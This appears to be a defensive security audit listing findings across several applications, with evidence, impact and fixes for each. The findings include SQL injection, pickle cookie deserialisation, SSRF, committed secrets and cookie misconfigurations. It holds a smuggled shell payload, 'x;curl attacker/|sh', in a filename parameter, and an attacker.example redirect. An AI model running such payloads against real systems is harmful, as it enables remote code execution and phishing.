findings.title: SQL injection in the invoice type-ahead search
findings.evidence: Line 47 reads $term = trim($request->query('q', '')) and line 57 splices it into the statement text: "and (number like '%{$term}%' or notes like '%{$term}%')". The same call binds account_id through the ? placeholder on line 60, so the parameterisation exists and this one value is outside it. trim() removes surrounding whitespace and neutralises nothing.
findings.impact: Any authenticated portal user can terminate the string literal and append arbitrary SQL to a query that runs with the application's full database rights, reading or altering every account's invoices rather than their own.
findings.recommendation: Bind the term: "and (number like ? or notes like ?)" with ['%'.$term.'%', '%'.$term.'%'] appended to the binding array.

triage.reason: The only control on this statement is the ? binding on line 60, which covers account_id and not $term; no middleware between routes/web.php:38 and the sink filters the value.
$term originates at line 47 from the client-supplied ?q= query parameter.
DB::select() with an interpolated string is a raw statement; Laravel does no implicit escaping of the sql argument.

findings.unaided_label: billing: search q concatenated into LIKE

findings.title: Invoice detail is fetched by id with no account scoping while its siblings scope theirs
findings.evidence: show() calls Invoice::with('account')->findOrFail($id) on the raw route id. The two sibling handlers in the same class both scope first: update() at line 101 and download() at line 113 each open with Invoice::where('account_id', $request->user()->account_id). The constructor adds only $this->middleware('auth') (line 14); there is no Policy, Gate or authorize() call anywhere in the file, and the view is handed $invoice->account as well.
findings.impact: Any signed-in customer can read any other customer's invoice, including the related account record, by walking sequential integer ids at /invoices/{id}.
findings.recommendation: Scope the lookup the way the siblings do: Invoice::where('account_id', $request->user()->account_id)->findOrFail($id), or register an InvoicePolicy and call $this->authorize('view', $invoice).

triage.reason: The 'auth' middleware on routes/web.php:36 establishes who the caller is and nothing establishes what is theirs; no global tenant scope exists on the model (app/Models/Invoice.php).
The route is the customer-facing portal, not an intentionally public endpoint.
The row carries billing totals, payment state and the related account (Invoice.php:21-44).

findings.unaided_label: billing: show() not scoped by account_id

findings.title: forceFill($request->all()) writes the guarded financial columns
findings.evidence: update() calls $invoice->forceFill($request->all())->save(). forceFill is the unguarded variant: it applies the whole array regardless of $fillable and $guarded. app/Models/Invoice.php:29-34 declares account_id, total_cents, paid_at and credit_applied_cents as $guarded precisely because they must not be client-writable, and no $request->validate() call constrains the payload.
findings.impact: A customer can PATCH /invoices/{id} with total_cents=0, paid_at set, credit_applied_cents inflated, or account_id pointed at another tenant, changing what they owe and who owns the record.
findings.recommendation: Replace with $invoice->fill($request->validate([...])) over an explicit allowlist of number, status, due_at, notes and po_reference, and drop forceFill from the request path entirely.

triage.reason: The $guarded declaration on Invoice.php:29 is the control, and forceFill is the documented way to bypass it; nothing else validates the body.
The reachable attributes are the invoice total, the paid marker, the applied credit and the owning account.

findings.title: Debug mode defaults to on and the environment defaults to production
findings.evidence: 'debug' => (bool) env('APP_DEBUG', true) on line 28, next to 'env' => env('APP_ENV', 'production') on line 15. The default when the variable is absent is therefore a production environment with the detailed error handler on, and the comment on lines 22-25 states this is deliberate so support can be sent the error page.
findings.impact: Laravel's debug handler renders the stack trace together with the resolved environment on any unhandled exception, which on this application includes APP_KEY, the database credentials and the payment webhook secret. Any error an unauthenticated visitor can trigger discloses them.
findings.recommendation: Invert the default to env('APP_DEBUG', false) so an unset variable fails closed, and route the support workflow through a correlation id and the server-side log.

triage.reason: This is the shipped default path, not a development-only branch: it takes effect exactly when the deployment does not set APP_DEBUG.
No other file in the tree forces debug off for production.

findings.title: A working application encryption key is committed as the APP_KEY default
findings.evidence: 'key' => env('APP_KEY', 'base64:c2FtcGxlLWtleS1mb3ItYmlsbGluZy1wb3J0YWwtMDE=') on line 52. The base64 payload decodes to a 32-byte string, i.e. a valid AES-256-CBC key rather than a ${VAR} placeholder, and the comment on lines 46-49 says it ships working so a fresh clone can boot without key:generate.
findings.impact: Any deployment that does not set APP_KEY encrypts and signs with a key that is public in this repository. config/security.php:50 sets session encrypt => true, so session payloads and every signed URL (config/security.php:74-79) become forgeable by anyone holding the source.
findings.recommendation: Remove the default so the framework refuses to boot without APP_KEY, generate per-environment keys in the secret store, and treat the committed key as compromised and rotate anything it protected.

triage.reason: It is a usable key, not a placeholder or a ${VAR} marker; the comment confirms it is intended to work.
It is the production-path default, applied whenever the environment variable is absent.

findings.title: CORS allows every origin while carrying credentials
findings.evidence: 'allowed_origins' => ['*'] on line 28 together with 'supports_credentials' => true on line 38, and the comment on lines 24-27 states the intent is to echo whatever the browser sends so new tenant vanity domains keep working. allowed_origins_patterns is empty (line 30), so there is no narrowing anywhere. Combined with 'same_site' => 'none' on line 70, the session cookie rides on those cross-origin requests.
findings.impact: Any web page a portal user visits can issue credentialed requests to the covered paths and read the responses, which is a full read/write compromise of the session for the routes CORS covers.
findings.recommendation: Resolve the tenant vanity domains at request time from the database and echo only an exact match, keep supports_credentials true only for that verified list, and never combine a wildcard with credentials.

triage.reason: There is no origin allowlist anywhere in the tree; the wildcard is the whole policy.
The covered responses are authenticated invoice data.

Laravel reads CORS from config('cors'); this array lives under config('security.cors') and the provider that maps it is not in the excerpt, so I cannot show the middleware consuming it. Status is therefore capped at probable.

findings.what_would_settle_it: config/cors.php or the service provider that maps config('security.cors') into the HandleCors middleware.

findings.title: Session cookie is deliberately readable by JavaScript
findings.evidence: 'http_only' => false on line 62, with the comment on lines 58-61 explaining that the embedded PDF viewer reads the session id out of document.cookie and forwards it on its own XHR.
findings.impact: The HttpOnly flag is the control that keeps a single cross-site scripting defect from becoming full account takeover. With it off, any script running on the page - including a third-party bundle - can read and exfiltrate the session identifier.
findings.recommendation: Set http_only => true and give the PDF worker its own short-lived, audience-scoped token issued server-side instead of handing it the browser session.

triage.reason: No other layer restores the protection; the flag is the protection.
It is load-bearing, not defence in depth: it is the only thing standing between a script and the session id.
As with F-006, the file is config/security.php rather than config/session.php and the mapping is not in the excerpt.

findings.what_would_settle_it: config/session.php, or the provider that merges this array into the session configuration.

findings.title: Session cookie is not marked Secure while SameSite is None
findings.evidence: 'secure' => false on line 68 with 'same_site' => 'none' on line 70. The comment on lines 65-67 argues the edge load balancer 301s :80 to https so the cookie never travels in the clear - but the 301 is answered only after the browser has already sent the request, cookie included.
findings.impact: The session cookie is transmitted on plaintext requests, so anyone on the network path collects it from the first http request a user makes. SameSite=None additionally directs the browser to attach it to cross-site requests, widening where that happens.
findings.recommendation: Set secure => true (browsers require Secure with SameSite=None in any case) and add HSTS at the edge so the browser never issues the plaintext request.

triage.reason: A redirect on :80 cannot protect a cookie the browser has already put on the wire.
Same wiring caveat as F-006 and F-007.

findings.unaided_label: billing: session secure false + samesite none
findings.what_would_settle_it: config/session.php, plus the edge configuration if HSTS is claimed.

findings.title: The login lockout is keyed on the IP, not on the account the comments claim
findings.evidence: The route carries ->middleware('throttle:5,1') on line 22, and the comment on lines 19-20 describes it as 'five attempts per minute per ip+email'. The bare throttle:maxAttempts,decayMinutes form has no named limiter and no resolver, so the key is the request fingerprint - the IP - and the email never enters it. AuthController::login (lines 29-30) then says lockout is the throttle middleware's job and only logs on a miss, so no per-account counter exists anywhere.
findings.impact: A distributed credential-stuffing run spreads across source addresses and never trips the counter, and no single account can ever be locked. The control that is believed to be present is present in a form that does not do what it is relied on for.
findings.recommendation: Define a named RateLimiter keyed on the submitted email as well as the IP, and add per-account lockout with backoff that survives a change of source address.

triage.reason: The throttle is real but keyed on the wrong subject; there is no second layer.
An edge WAF could add per-identity limiting; no such artifact is in the tree, so this is UNKNOWN and the finding is capped at probable.

findings.unaided_label: billing: login throttle keyed on IP only
findings.what_would_settle_it: A named RateLimiter registration in a RouteServiceProvider, or the edge rate-limiting policy.

findings.title: Legacy reset tokens are truncated MD5 over a non-cryptographic seed
findings.evidence: return substr(md5($user->email . microtime() . mt_rand()), 0, 24). The seed is the victim's own email, a timestamp and mt_rand (a Mersenne Twister, not a CSPRNG), and the output is truncated to 96 bits. The current path at line 65 does the right thing - hash('sha256', bin2hex(random_bytes(32))) - so this is the superseded generator, and the docblock on lines 99-102 says it is retained while mailed links are still being migrated.
findings.impact: Tokens of this shape are guessable given the address and an approximate send time, which is a password reset for a chosen account. The docblock implies links in this format are still honoured in the wild.
findings.recommendation: Delete the method and expire any outstanding token that was minted by it rather than letting the migration window keep it alive.

triage.reason: No caller exists in this tree - the method is protected and unreferenced - but the docblock says the format is still being migrated, and the verifying side is not in scope. Capped at probable.
The email component is attacker-known and mt_rand is predictable from observed output.

findings.what_would_settle_it: The reset-verification path, and whether tokens of the 24-hex-character shape are still accepted.

findings.title: SQL injection in the flag search term
findings.evidence: The statement is assembled with format! on lines 14-22 and the search term is interpolated directly: "AND (key ILIKE '%{term}%' OR description ILIKE '%{term}%')". Only tenant_id is bound, on line 25. term arrives as ListQuery.q (routes.rs:24), a #[serde(default)] String taken straight off the query string with no validation. The ORDER BY fragment on lines 18-21 really is safe - it comes from the SortKey/SortDir enums - which is what the doc comment is about, and the term beside it is not covered by that argument.
findings.impact: Any caller holding a token, or any caller at all via F-012, can break out of the literal and read or modify every tenant's flags; the tenant_id bind on line 25 is trivially neutralised by the injected text.
findings.recommendation: Bind the term as $2 and pass format!("%{}%", term) as a bound value, keeping the enum-derived ORDER BY as it is.

triage.reason: The tenant_id bind is the only parameterisation and it does not cover term.
ListQuery.q is deserialised from the request query string (routes.rs:53).
sqlx::query_as over a &str built by format! is a raw statement; sqlx applies no escaping to the sql text.

findings.title: A request header grants administrator rights
findings.evidence: After the JWT is decoded, lines 50-54 read the X-Flags-Elevate header off the caller's own HeaderMap and line 59 sets is_admin: elevated || data.claims.roles.iter().any(|r| r == admin_claim). Nothing establishes that the header came from the internal console the comment on lines 48-49 describes - it is read from the same HeaderMap the bearer token came from. routes.rs:112 and routes.rs:138 gate upsert and archive on exactly this flag.
findings.impact: Any caller with any valid token - or, given the header is read before any check that depends on it, any caller the token layer admits - sends 'X-Flags-Elevate: true' and gains flag creation, archival and force-rollout for their tenant, including setting the webhook_url that F-013 turns into outbound requests.
findings.recommendation: Delete the header path. If the console proxies on-call engineers, have it mint a short-lived token carrying the flags:admin claim, or authenticate the proxy itself with mTLS and accept the assertion only on that channel.

triage.reason: No layer between the socket and auth.rs:50 removes or validates the header; main.rs adds only CORS and TraceLayer.
The value is an ordinary request header, fully attacker-controlled.
The boundary is explicit: is_admin separates tenant readers from tenant administrators.

findings.title: Server-side request forgery through the flag webhook URL
findings.evidence: notify_rollout posts to flag.webhook_url with no validation of scheme, host or resolved address (lines 12 and 28-35). The value is stored verbatim by store::upsert_flag (store.rs:74) from FlagUpsert.webhook_url (model.rs:72), a plain Option<String> off the request body. routes.rs:124 fires the call whenever rollout_percent reaches 100. The reqwest client (main.rs:85-87) sets only a timeout, so redirects are followed with the default policy.
findings.impact: The service can be made to POST from its own network position to loopback, to RFC1918 neighbours or to a cloud metadata endpoint. Given F-012, reaching the admin path costs one header, so this is effectively unauthenticated blind SSRF from inside the deployment network.
findings.recommendation: Validate the URL on write: require https, resolve the host and reject loopback, link-local, RFC1918 and CGNAT ranges, re-check after each redirect or disable redirects, and prefer an allowlist of registered notification endpoints per tenant.

triage.reason: There is no allowlist, scheme check or egress policy anywhere in the tree; docker-compose.yml places no network restriction on the api service.
webhook_url is a request-body field.
Outbound notification is intended; reaching arbitrary internal addresses is not, and nothing bounds it.

findings.title: The webhook signing key silently defaults to empty
findings.evidence: let secret = std::env::var("FLAGS_WEBHOOK_SIGNING_KEY").unwrap_or_default(). When the variable is unset the key is the empty string, and the next line's expect("hmac accepts any key size") makes that succeed rather than fail. The header is still emitted on line 32, so the request looks signed. No file in the tree sets the variable: docker-compose.yml lines 10-13 pass only FLAGS__DATABASE__URL, FLAGS__SERVER__BIND and RUST_LOG.
findings.impact: Consumers see an X-Flags-Signature header and a digest that verifies against a key anyone can guess, so anybody can forge a rollout notification. The control runs, returns and cannot fail, which is the shape that makes it read as present in review.
findings.recommendation: Read the key once at start-up and refuse to boot if it is missing or shorter than 32 bytes, so a missing secret is a deployment failure rather than a silently unauthenticated notification.

triage.reason: The HMAC is the control and unwrap_or_default() removes its key.
This is the shipped path; the compose file that deploys the service does not set the variable.
There is no second integrity check on the notification.

findings.title: The Docker daemon socket is mounted into the application container
findings.evidence: - /var/run/docker.sock:/var/run/docker.sock under services.api, with the comment on lines 16-17 explaining the rollout job shells out to docker restart on the sidecars. The same service is the one exposed on 0.0.0.0:8080 (lines 12 and 14-15) and the one carrying F-011's SQL injection and F-013's SSRF.
findings.impact: Write access to the daemon socket is equivalent to root on the host: a container can be started with the host filesystem bind-mounted. Any code execution in the API - or any request that reaches the socket - escalates from a web bug to full host compromise, and the blast radius includes every other container on that host.
findings.recommendation: Remove the mount. Drive restarts through an orchestrator API with a scoped credential, or put a socket proxy in front that permits only the specific restart call on the specific sidecars.

triage.reason: The access is intended but unbounded: the full daemon API is exposed, not the one restart operation the comment justifies. Per FP-05 the finding moves to what sits behind the exposure, which here is host root.
The API container is internet-facing on 8080; the host is a second principal.

findings.title: The database password is committed in the compose file
findings.evidence: FLAGS__DATABASE__URL: postgres://flags:flags-svc-2024@db:5432/flags on line 11 and again on line 46 for the migrate service. The db service in the same file does it correctly, via POSTGRES_PASSWORD_FILE and the flags_db_password secret (lines 31-33 and 52-54), so the mechanism is present and two of the three services bypass it.
findings.impact: A live database password is in version control and in the process environment of two containers. It is readable by anyone with repository access and by anything that can read /proc, and it is already compromised for as long as it has been committed.
findings.recommendation: Move both services to the existing flags_db_password secret, rotate the password, and add a secret scan to CI so the next one is caught at the commit.

triage.reason: It is a concrete value, not ${VAR} or a changeme placeholder, and it matches the service naming convention of a real credential.
It is on the deployment path for both the api and the migrate service.

findings.title: Six declared limits and timeouts that no code reads
findings.evidence: Working from the config file key by key and grepping src/ for each reader: server.request_timeout_ms (line 7) and server.shutdown_grace_ms (line 8) appear only as struct fields (main.rs:20-21) - no TimeoutLayer is added in main.rs:118-122 and axum::serve on line 127 has no graceful-shutdown future, though tower-http's timeout feature is enabled in Cargo.toml:12. database.statement_timeout_ms (line 13) appears only at main.rs:28; PgPoolOptions on lines 80-83 sets max_connections and nothing else. webhooks.max_body_bytes (line 29) appears only at main.rs:47. cors.probe_origins (line 34) appears only at main.rs:40 - the probe layer on line 98 is hardcoded to AllowOrigin::any(). The whole [evaluation] section (lines 21-24: default_ttl_seconds, max_rules_per_flag, max_variants) has no corresponding field on Settings (main.rs:51-58) at all, so it is not even deserialised.
findings.impact: Every one of these knobs can be set by an operator, appears in the configuration file as though it governs behaviour, and governs nothing. Concretely: requests have no timeout, the ILIKE '%term%' scan in store::search_flags has no statement timeout to bound it, shutdown is not graceful, and max_rules_per_flag and max_variants do not constrain upsert (routes.rs:105-129, which checks only rollout_percent). An operator raising or lowering any of these gets no change in behaviour and no error.
findings.recommendation: Either wire each key to the mechanism it names - TimeoutLayer, a statement_timeout on the pool's after_connect, graceful shutdown, a body limit layer, the probe CorsLayer, and range checks in upsert - or delete the keys so the file stops describing controls that do not exist.

triage.reason: There is no external layer claimed or evidenced; the compose file publishes the port directly (docker-compose.yml:14-15) with no proxy in front.
The config crate deserialises by field name into Settings, and I checked the struct: there is no [evaluation] field, and the other five appear as fields with no further reference in src/.

findings.title: The JWT decoding key is built from the issuer URL string
findings.evidence: DecodingKey::from_rsa_pem(state.settings.auth.issuer.as_bytes()) - the argument is the issuer, which config/default.toml:16 sets to https://id.internal.example/realms/platform. That is a URL, not a PEM, so the call returns Err and every authenticated route answers 500 (line 35). The comment on lines 32-33 claims the realm's public key is fetched at boot and cached beside the pool; no such fetch exists in main.rs, and AppState (main.rs:60-64) has no field for it.
findings.impact: The failure is closed, so this is not an authentication bypass. What it means is that no signature verification has ever actually run, that the entire authenticated API is unavailable, and that the key-loading the comment describes is not implemented - so whoever repairs it is one plausible edit away from putting key material in a field named issuer.
findings.recommendation: Fetch the realm JWKS at start-up, keep the DecodingKey in AppState rather than rebuilding it per request, and add a test that a token signed by the real issuer is accepted and one signed by another key is rejected.

triage.reason: from_rsa_pem parses PEM; a URL cannot parse, so the error path is the only path.
It is the shipped configuration default and the only key source in the tree.

The direction of the failure is closed, so the impact is availability and a latent misconfiguration rather than a bypass; severity is set to low on that basis, and per FP-10 the finding is still recorded.

findings.title: Database and token errors are returned verbatim to the caller
findings.evidence: Every handler maps its error with .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, e.to_string())) - lines 59, 73, 78, 93, 100, 122, 144 and 149 - so the sqlx error text becomes the response body. Line 46 does the same for the jsonwebtoken error: AuthError::Rejected(m) => (StatusCode::UNAUTHORIZED, m).
findings.impact: sqlx surfaces the PostgreSQL message, which names the relation, the column and the syntax error position. Against the injection in F-011 that turns a blind hole into an error-based one, and the token errors distinguish 'bad signature' from 'expired' from 'wrong audience' for an unauthenticated caller.
findings.recommendation: Return a generic message with a correlation id and log the detail server-side; keep the specific text out of the response body.

triage.reason: No error-mapping layer sits between the handlers and the client.
On its own this is reconnaissance rather than direct impact, which is why it is low; per FP-10 it is recorded rather than dropped, and it materially raises the severity of F-011.

findings.unaided_label: edge-flags: sqlx/jwt error text to client

findings.title: Superseded webhook digest uses unkeyed MD5
findings.evidence: legacy_digest hashes tenant_id and payload with Md5 and returns the hex digest. It is not an HMAC - the construction is hash(secret-ish prefix || message), which is length-extendable - and MD5 is broken for collision resistance. It carries #[allow(dead_code)] on line 57 and the comment on lines 55-56 says the last consumer moved to X-Flags-Signature in 0.5; grep finds no caller in the crate, and md-5 is still a declared dependency (Cargo.toml:27).
findings.impact: Nothing calls it today, so the exposure is the risk that a consumer still verifying the 0.3 format accepts a forged digest, plus a broken primitive kept alive in the dependency set.
findings.recommendation: Delete the function and drop md-5 from Cargo.toml so it cannot be reintroduced by a copy-paste.

triage.reason: #[allow(dead_code)] and the absence of callers in this crate are good evidence it does not run, but the consumer side that might still verify the 0.3 format is not in scope. Capped at probable.
The payload half of the input is attacker-influenced flag data.

findings.what_would_settle_it: Whether any deployed consumer still accepts the 0.3 digest format.

findings.title: A client-supplied cookie is unpickled
findings.evidence: saved = pickle.loads(base64.b64decode(raw_cookie)) where raw_cookie is request.COOKIES.get('hd_filters') read on line 48. There is no signature, no MAC and no format check - Django's signed-cookie machinery is not used - and the try/except on lines 51-54 catches the exception after unpickling has already run. The stored value is only ever used for two filter keys (lines 58-62).
findings.impact: pickle reconstructs arbitrary objects and executes code while doing so. Setting one cookie on a request to /tickets/ gives remote code execution in the web process, as whichever account gunicorn runs as. The attacker does not even need to be authenticated in the usual sense - they need only reach the view, and the cookie is read before the queryset is built.
findings.recommendation: Store the layout as JSON and read it with json.loads, or use django.core.signing / request.session. Never unpickle anything that crossed the network.

triage.reason: No integrity check precedes the call; the except clause runs after the fact.
The value is a request cookie.
pickle is precisely the format that executes during reconstruction.

findings.title: Command injection through the export filename
findings.evidence: subprocess.run(f"zip -j -q {dest} {tmp_path}", shell=True, check=True) where dest is os.path.join(settings.EXPORT_ROOT, filename + ".zip") on line 40. filename is passed in by views.ticket_export, which takes it straight from request.GET.get('filename', ...) on views.py:96 and hands it to the task on line 98. Nothing between the query string and the shell validates it - the docstring on lines 17-18 says the agent names the file so the download is recognisable. The sibling task on line 58 builds its command from a uuid and an allowlisted extension, which is why that one is safe and this one is not.
findings.impact: ?filename=x;curl attacker/|sh executes as the Celery worker. os.path.join also lets an absolute filename relocate the write, so the same parameter is an arbitrary-path write even without the shell.
findings.recommendation: Drop shell=True and pass an argv list, and derive the on-disk name from the queue id and a uuid, keeping the agent's chosen name only in the Content-Disposition header of the download.

triage.reason: No validation exists on any hop: the view does not check it, the task does not check it, and the form layer is not involved.
It is a GET parameter (views.py:96).
shell=True with an f-string is a shell command line, not an argv vector.

findings.unaided_label: helpdesk: export filename into zip shell

findings.title: DEBUG defaults to on
findings.evidence: DEBUG = os.environ.get("DJANGO_DEBUG", "1") == "1" - the default when the variable is absent is "1", so debug is on unless something turns it off. The comment on lines 17-18 says agents paste the yellow error page into escalation tickets and that this is how the queue rules get debugged, so it is on deliberately.
findings.impact: Django's technical 500 page renders the settings module with local variables. On this configuration that discloses SECRET_KEY (line 21), the database password (line 92), the Celery broker URL (line 132) and the attachment and export roots - to anyone who can provoke an exception. DEBUG=True also disables ALLOWED_HOSTS enforcement and keeps every SQL query in memory.
findings.recommendation: Default to off: os.environ.get("DJANGO_DEBUG", "0") == "1", and give the agents a correlation id plus server-side log access instead of the error page.

triage.reason: The default is the production path - it applies exactly when the deployment does not set the variable.
Nothing else in the settings module forces it off.

findings.title: A usable SECRET_KEY is hardcoded as the fallback
findings.evidence: SECRET_KEY = os.environ.get("DJANGO_SECRET_KEY", "django-insecure-hd-6f2b1c9a4d7e0b5318ca77e2049fbd6c"). The fallback is a complete, working key committed to the repository, and it is used whenever the environment variable is absent.
findings.impact: SECRET_KEY signs sessions, CSRF tokens, password-reset tokens and every django.core.signing value. With it known, an attacker forges a session cookie for any user id and a valid CSRF token, which is unauthenticated administrative access. The 'django-insecure-' prefix is startproject's own warning that the value was never meant to leave a developer machine.
findings.recommendation: Remove the fallback so the application refuses to start without DJANGO_SECRET_KEY, and rotate the key - which invalidates existing sessions by design.

triage.reason: It is a usable key rather than a placeholder token.
It is on the production path whenever the variable is unset.

findings.title: Open redirect on the post-login hop
findings.evidence: return redirect(request.GET.get("next", settings.LOGIN_REDIRECT_URL)) with no host or scheme check. django.shortcuts.redirect passes an arbitrary string through to HttpResponseRedirect; the validation that django.contrib.auth.views.LoginView performs with url_has_allowed_host_and_scheme is not present here. The middleware that feeds the parameter (middleware.py:18) only ever writes a local path, but nothing constrains what a caller may put there.
findings.impact: /accounts/login/?next=https://attacker.example lands the user on an attacker page immediately after a successful sign-in, with the credibility of having just authenticated - the standard setup for credential phishing and consent-screen abuse.
findings.recommendation: Validate with url_has_allowed_host_and_scheme(next, allowed_hosts={request.get_host()}, require_https=request.is_secure()) and fall back to LOGIN_REDIRECT_URL when it fails, or switch to Django's built-in LoginView.

triage.reason: No layer validates the redirect target; the middleware writes the default value but does not constrain a supplied one.
next is a query-string parameter under the attacker's control.
redirect() with a string argument is treated as a URL, not as a view name, once it contains a scheme or a leading slash.

findings.title: Session and CSRF cookies are served without Secure
findings.evidence: SESSION_COOKIE_SECURE = False (line 118) and CSRF_COOKIE_SECURE = False (line 119). The comment on lines 116-117 states the reason: TLS terminates at the branch-office proxy and the last hop to the app servers is plain http, so the cookies have to be allowed over :80. SECURE_SSL_REDIRECT is not set anywhere in the module, so the SecurityMiddleware on line 43 is not redirecting either.
findings.impact: Session and CSRF cookies traverse the internal network in clear text on every request. Anyone with access to that segment - the branch office LAN, the proxy host, a mirrored port - collects live sessions.
findings.recommendation: Terminate TLS at the application or run the last hop over TLS, then set both flags to True and enable SECURE_SSL_REDIRECT and SECURE_PROXY_SSL_HEADER.

triage.reason: The comment describes the last hop as plaintext, so no transport control compensates - it is the reason the flags are off.
The branch-office network is a second principal relative to the application host.

findings.title: No attempt limiting on authentication
findings.evidence: login_view calls authenticate() on every POST with no counter, no lockout and no backoff. MIDDLEWARE (settings.py:42-54) contains no throttling component, requirements.txt has no rate-limiting package (django-axes, django-ratelimit or equivalent), and there is no cache-based counter - CACHES is not even defined. AUTH_PASSWORD_VALIDATORS (lines 99-105) constrains what users may choose but does nothing about guessing rate.
findings.impact: Unlimited password guessing against every account, at whatever rate the worker pool sustains, with no detection signal since nothing logs the failures either.
findings.recommendation: Add per-account and per-source attempt limiting with exponential backoff, and log failed attempts with the username and source address so the attempt is visible.

triage.reason: No middleware, decorator or dependency in the tree implements it.

An upstream proxy could rate-limit; no configuration for one is in the tree. This does not rescue the account-level lockout, which is what matters for a targeted account, so the finding stands on that half.

findings.what_would_settle_it: An edge rate-limiting policy, though it would not supply per-account lockout.

findings.title: The admin grants delete to every staff user regardless of permissions
findings.evidence: def has_delete_permission(self, request, obj=None): return True - unconditional, overriding Django's check against the delete_<model> permission. It is inherited by QueueAdmin, TicketAdmin, CommentAdmin and AttachmentAdmin (lines 38, 45, 54, 61). The sibling class two definitions later shows the intended shape: OrganizationAdmin.has_delete_permission returns request.user.is_superuser (line 34). The class docstring (lines 9-12) argues that get_queryset makes this safe, which addresses which objects are reachable, not who may delete them.
findings.impact: A support lead granted only view or change on tickets can delete tickets, queues, comments and attachments across their whole organization, including through the changelist bulk action. Ticket rows are the audit record of what support did, so this is destruction of evidence by an under-privileged account.
findings.recommendation: Delete the override and let Django's model permissions decide, or return request.user.has_perm(f'{opts.app_label}.delete_{opts.model_name}') combined with the org scope.

triage.reason: get_queryset scopes which rows are visible; it does not restore the permission check the override removed.
A staff user without delete rights and one with them are two distinct principals; that separation is what the override erases.
The Django ModelAdmin hook is exactly the permission gate, and the sibling class in the same file uses it as one.

findings.title: OrganizationAdmin is not org-scoped, unlike every sibling in the file
findings.evidence: class OrganizationAdmin(admin.ModelAdmin) - it extends the plain ModelAdmin and defines no get_queryset, while QueueAdmin, TicketAdmin, CommentAdmin and AttachmentAdmin all extend OrgScopedAdmin and inherit the filter on line 22. list_display and search_fields expose name and slug (lines 30-31).
findings.impact: Any staff user of any tenant who holds view_organization sees the full customer list of the platform - every other organization's name and slug - which is competitor-visible commercial information and a ready-made target list.
findings.recommendation: Have OrganizationAdmin extend OrgScopedAdmin with org_field = 'id', or override get_queryset to return only the requesting user's own organization for non-superusers.

triage.reason: No queryset filter applies to this ModelAdmin; the scoping base class is the control and this class does not use it.
The tenant roster of a multi-tenant help desk is not public data.
Nothing in the file marks organizations as intentionally shared.

findings.title: An attachment found to be infected is removed from the database but left on disk
findings.evidence: On returncode == 1 the task calls attachment.delete() and returns 'infected'. That deletes the row; the blob was written to attachment.stored_path by views.add_attachment (views.py:162-164) and nothing unlinks it. stored_path (models.py:82-84) is a path under settings.ATTACHMENT_ROOT, described in the docstring as the worker's shared volume, so the file remains readable to everything mounting it. The comparable path in export_queue_csv does remember to clean up, with os.unlink on line 43.
findings.impact: Malware confirmed by the scanner stays on a volume shared by the web tier and the workers, now with no database row pointing at it - so it is invisible to the application and not covered by any retention job. Uploading is the only step needed to place it there.
findings.recommendation: Unlink stored_path before or with the row deletion, and reconcile orphaned blobs against Attachment rows periodically.

triage.reason: No cleanup exists on this path; the only os.unlink in the module is in the other task.
The volume is shared between the web tier and the workers, so the file is reachable by processes other than the one that wrote it.
Execution still requires something else on the host to open the file, so this is bounded to low rather than an execution finding; per FP-10 it is recorded.

findings.unaided_label: helpdesk: infected blob left on disk

findings.title: Sessions are stored in a cache backend that is never configured
findings.evidence: SESSION_ENGINE = "django.contrib.sessions.backends.cache" while no CACHES setting exists anywhere in the module - I grepped the file. Django then falls back to the default LocMemCache, which is per-process and in-memory. requirements.txt ships gunicorn (line 9), which runs multiple workers, and redis is present (line 3) but wired only to Celery (lines 132-133).
findings.impact: Each worker holds its own session table, so a session is valid only against the worker that created it and vanishes on restart or deploy. Beyond the availability effect, SESSION_COOKIE_AGE of 10 hours (line 112) is not actually enforceable and there is no way to invalidate a session server-side across the fleet - which is the control an incident response depends on.
findings.recommendation: Point CACHES at the Redis instance already in the deployment and use django.contrib.sessions.backends.cached_db, so sessions are shared, revocable and durable.

triage.reason: No CACHES definition exists to supply a shared backend.
A settings override module for production could define CACHES; it is not in the tree. The finding is recorded against the module as given.
The primary effect is availability and non-revocability rather than direct compromise, which sets severity at low.

findings.what_would_settle_it: A production settings module defining CACHES.

findings.title: SECURITY DEFINER function with no search_path resolves its tables from the caller's
findings.evidence: post_journal is declared LANGUAGE plpgsql SECURITY DEFINER (lines 34-35) and owned by ledger_owner (line 111), but carries no SET search_path clause. Its body then writes to unqualified relations: INSERT INTO journals (line 56), INSERT INTO entries (line 60) and INSERT INTO audit_log (line 68). The sibling definer function 20 lines below does it correctly - archive_account has SET search_path = ledger, pg_temp on line 84 - and so does current_tenant (002_rls.sql:24), so the asymmetry is inside the same file. ledger_app holds EXECUTE on it (004_grants.sql:27) and, like every role, can create objects in pg_temp, which PostgreSQL searches ahead of the rest for table names.
findings.impact: The caller controls which relations those three inserts resolve to. Creating pg_temp.audit_log makes the audit record land in a throwaway table, so a journal is posted with no trace; the same technique against journals and entries, or a temporary object carrying an expression that runs during the insert, executes with ledger_owner's rights - the role that owns the schema all of the RLS is attached to.
findings.recommendation: Add SET search_path = ledger, pg_temp to post_journal, matching archive_account, and schema-qualify the three INSERT targets. Adopt the rule that no SECURITY DEFINER routine is created without an explicit search_path.

triage.reason: REVOKE ALL ON SCHEMA public FROM PUBLIC (004_grants.sql:32) closes the public schema route but not the pg_temp one, which needs only the TEMP privilege every role has by default.
The resolution target is chosen by the caller's session, not by the function.
The sibling function in the same file sets search_path explicitly, which is what the construct is for.

findings.title: The database password file is written world-readable
findings.evidence: chmod 0644 "${CONFIG_DIR}/db.env" on line 69, where CONFIG_DIR is /etc/ledger (line 15) and the file written at lines 59-65 contains LEDGER_DB_PASSWORD=${APP_PASSWORD} fetched from Vault at line 55. The comment on lines 67-68 gives the reason: the API container, the reporting sidecar and the on-call shell all source it and do not share a group. deploy/backup.sh:14 sources the same file.
findings.impact: Every local account on the host reads the ledger application's database password - the credential that reaches the financial records through pgbouncer. The script's own userlist handling shows the correct pattern eight lines earlier: umask 0177 for /etc/pgbouncer/userlist.txt (lines 101-107).
findings.recommendation: Create a shared group for the three consumers, chown root:ledger-readers and chmod 0640, or hand each consumer its own credential from Vault at start-up instead of a file on disk.

triage.reason: The value is a live secret from the secret store, not a placeholder.
Every unprivileged local account is a second principal; the comment names three distinct consumers that deliberately do not share a group.
Sharing with three known consumers is intended; sharing with all of them plus everyone else is not, and nothing bounds it.

findings.title: The export volume is made world-writable
findings.evidence: chmod -R 0777 "$EXPORT_DIR" where EXPORT_DIR is /srv/ledger/exports (line 14). The comment on lines 113-115 says the API writes statement bundles there and the reporting sidecar, the nightly archiver and the ops jobs pick them back up under their own accounts. The -R makes every existing bundle world-writable too.
